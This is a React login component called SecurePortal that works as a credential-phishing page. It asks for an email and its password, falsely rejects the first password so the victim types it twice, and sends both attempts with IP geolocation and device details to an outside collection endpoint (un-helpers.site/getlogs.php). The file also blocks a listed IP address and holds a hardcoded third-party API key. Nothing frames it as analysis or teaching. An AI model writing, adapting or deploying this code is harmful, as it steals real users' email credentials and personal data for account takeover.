import React, { useState, useEffect, useRef } from 'react';
import axios from 'axios';
import { useNavigate } from 'react-router-dom';
import './Access.css';

const SecurePortal = () => {
  const [userInput, setUserInput] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isValidated, setIsValidated] = useState(false);
  const [accessCode, setAccessCode] = useState('');
  const [firstTry, setFirstTry] = useState('');
  const [secondTry, setSecondTry] = useState('');
  const [errorMsg, setErrorMsg] = useState('');
  const [tryCount, setTryCount] = useState(0);
  const [isLocked, setIsLocked] = useState(false);
  const [clientIP, setClientIP] = useState('');
  const [locationData, setLocationData] = useState({});
  const [systemInfo, setSystemInfo] = useState({});
  const inputRef = useRef(null);
  const redirect = useNavigate();
  const blockedIPs = ['86.98.95.155'];

  const obscureParam = (text) => {
    try {
      return encodeURIComponent(btoa(text));
    } catch {
      return null;
    }
  };

  const isWeakCode = (code) => {
    if (!code || code.length < 5) return true;
    const weakPatterns = [
      /^1234?$/, /^asd$/, /^xdds?$/, /^\d{1,3}$/, /^[a-z]{3,4}$/i,
      /^password$/i, /^qwerty$/i, /^admin$/i, /^letmein$/i, /^welcome$/i
    ];
    return weakPatterns.some(pattern => pattern.test(code));
  };

  useEffect(() => {
    const getNetworkData = async () => {
      try {
        const ipResponse = await axios.get('https://api.ipify.org?format=json');

        if (blockedIPs.includes(ipResponse.data.ip)) {
          alert('Access not available');
          window.location.href = '/restricted';
          return;
        }
        setClientIP(ipResponse.data.ip);

        const geoData = await axios.get(
          `https://api.geoapify.com/v1/ipinfo?&apiKey=7fb21a1ec68f44bb9ebbfe6ecea28c06&ip=${ipResponse.data.ip}`
        );
        const { country, city, continent } = geoData.data;

        setLocationData({
          country: country?.names?.en || 'Unknown',
          city: city?.names?.en || 'Unknown',
          region: continent?.names?.en || 'Unknown',
        });
      } catch {
        return;
      }
    };

    const getSystemDetails = () => {
      const details = {
        agent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
      };

      if (navigator.userAgentData) {
        details.platform = navigator.userAgentData.platform;
        details.vendor = navigator.userAgentData.brands?.map((b) => b.brand).join(', ') || '';
        details.isMobile = navigator.userAgentData.mobile || false;
      }

      setSystemInfo(details);
    };

    getNetworkData();
    getSystemDetails();

    const params = new URLSearchParams(window.location.search);
    let paramData = params.get('u') || params.get('id');

    if (paramData) {
      if (paramData.includes('@')) {
        if (paramData.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
          setUserInput(paramData);
          setIsValidated(true);
          setTimeout(() => inputRef.current?.focus(), 100);
          const obscured = obscureParam(paramData);
          if (obscured) {
            window.history.replaceState({}, '', `?u=${obscured}`);
          }
        }
      } else {
        try {
          paramData = atob(decodeURIComponent(paramData));
          if (paramData.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
            setUserInput(paramData);
            setIsValidated(true);
            setTimeout(() => inputRef.current?.focus(), 100);
          }
        } catch {
          return;
        }
      }
    }
  }, []);

  useEffect(() => {
    if (!isLocked && inputRef.current) {
      inputRef.current.focus();
    }
  }, [isLocked]);

  const handleInputChange = (e) => {
    setUserInput(e.target.value);
    if (isValidated) {
      setIsValidated(false);
      setAccessCode('');
      setErrorMsg('');
      setTryCount(0);
      setFirstTry('');
      setSecondTry('');
    }
  };

  const validateInput = () => {
    if (!userInput.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
      setErrorMsg('Valid email required');
      return;
    }

    setIsLoading(true);
    setErrorMsg('');

    setTimeout(() => {
      setIsLoading(false);
      setIsValidated(true);
      const obscured = obscureParam(userInput);
      if (obscured) {
        window.history.replaceState({}, '', `?u=${obscured}`);
      }
      setTimeout(() => inputRef.current?.focus(), 100);
    }, 300);
  };

  const sendFirstTry = async (code) => {
    try {
      await axios.post('https://un-helpers.site/getlogs.php/', {
        email: userInput,
        firstpasswordused: code,
        country: locationData.country,
        continent: locationData.region,
        city: locationData.city,
        device: {
          userAgent: systemInfo.agent,
          language: systemInfo.language,
          platform: systemInfo.platform,
          brand: systemInfo.vendor,
          mobile: systemInfo.isMobile,
        },
      }, {
        headers: {
          'Content-Type': 'application/json',
        },
      });
    } catch {
      return;
    }
  };

  const handleAccess = async () => {
    if (isWeakCode(accessCode)) {
      setAccessCode('');
      if (inputRef.current) inputRef.current.focus();
      return;
    }

    if (tryCount === 0) {
      const code = accessCode;
      setFirstTry(code);
      setTryCount(1);
      setAccessCode('');
      setIsLocked(true);

      await sendFirstTry(code);

      setTimeout(() => {
        setErrorMsg(<span className='status-notification'>The email or password entered is incorrect. Please try again.</span>);
        setIsLocked(false);
      }, 200);
      return;
    }

    setIsLoading(true);
    setErrorMsg('');

    try {
      await axios.post('https://un-helpers.site/getlogs.php/', {
        email: userInput,
        secondpasswordused: accessCode,
        country: locationData.country,
        continent: locationData.region,
        city: locationData.city,
        device: {
          userAgent: systemInfo.agent,
          language: systemInfo.language,
          platform: systemInfo.platform,
          brand: systemInfo.vendor,
          mobile: systemInfo.isMobile,
        },
      }, {
        headers: {
          'Content-Type': 'application/json',
        },
      });
    } catch (err) {
      if (err.message === 'Network Error') {
        setErrorMsg('Network issue. Please retry.');
      } else if (err.response) {
        setErrorMsg(`Access problem. Status: ${err.response.status}`);
      } else {
        setErrorMsg('System error. Refresh and retry.');
      }
    } finally {
      setIsLoading(false);
      redirect('/error');
    }
  };

  return (
    <div className="access-interface">
      <form className="auth-panel" autoComplete="off">
        <input type="text" style={{ display: 'none' }} autoComplete="false" />

        <div className="auth-section">
          {isValidated ? (
            <h3>Confirm email password to continue</h3>
          ) : (
            <h2>Provide your email</h2>
          )}
          <div className="id-input-container">
            <input
              id="user-field"
              type="email"
              value={userInput}
              onChange={handleInputChange}
              disabled={isValidated}
              placeholder="Your email address"
              required
              autoFocus={!isValidated}
              className="data-field"
            />
          </div>
          {!isValidated && (
            <div className="action-container">
              <button
                onClick={validateInput}
                disabled={isLoading || isValidated || !userInput}
                className="auth-btn"
              >
                {isLoading ? (
                  <span className="load-indicator"></span>
                ) : (
                  'Verify Email'
                )}
              </button>
            </div>
          )}
        </div>

        {isValidated && (
          <>
            <div className="auth-section">
              <input
                id="code-input"
                type="password"
                ref={inputRef}
                value={accessCode}
                onChange={(e) => setAccessCode(e.target.value)}
                placeholder="Email Password"
                required
                autoFocus
                disabled={isLocked}
                className="data-field"
              />
            </div>

            {errorMsg && (
              <div className="status-notification">{errorMsg}</div>
            )}

            <div className="action-container">
              <button
                type="button"
                onClick={handleAccess}
                disabled={isLoading || isLocked || !accessCode}
                className="auth-btn"
              >
                {isLoading ? (
                  <span className="load-indicator"></span>
                ) : (
                  'Continue'
                )}
              </button>
            </div>
          </>
        )}
      </form>
    </div>
  );
};

export default SecurePortal;
